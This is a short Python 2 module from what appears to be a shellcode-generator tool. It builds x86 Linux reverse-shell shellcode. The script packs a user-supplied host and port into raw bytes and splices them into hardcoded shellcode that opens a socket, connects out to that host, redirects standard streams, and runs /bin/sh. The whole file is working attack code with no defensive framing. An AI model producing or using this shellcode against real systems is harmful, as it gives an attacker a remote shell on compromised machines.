#!/usr/bin/env python
import struct
import socket
from trexshellz import args_host,args_port

# reverse shell module
# ready to add optimized shellcode to code[], below

port = '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('>H',args_port))
print "port after struct pack: " + port
packedIP = socket.inet_aton(args_host)    # returns hex but need to reverse byte order
i = packedIP.encode("hex")
#print "host encode hex: " + i
j = int(i,16)
#print "host conversion to int: " + str(j)
IP = '\\x' + '\\x'.join(x.encode('hex') for x in struct.pack('>L',j))
#print('IP after struct pack: {!r}.'.format(IP))
print "IP after struct pack: " + IP

code = ["\\x31\\xdb\\xf7\\xe3\\x50\\x6a\\x01\\x6a\\x02\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xc6\\x43\\x68",
        IP,
        "\\x66\\x68",
        port,
        "\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x31\\xc9\\x89\\xf3\\xb1\\x03\\xfe\\xc9\\xb0\\x3f\\xcd\\x80\\x75\\xf8\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x53\\x89\\xe1\\xb0\\x0b\\xcd\\x80",
	]

# better way to print list as one string?
sc = ''.join(code)

print "shellcode: " + sc

#print('shellcode: {!r}.'.format(str1))

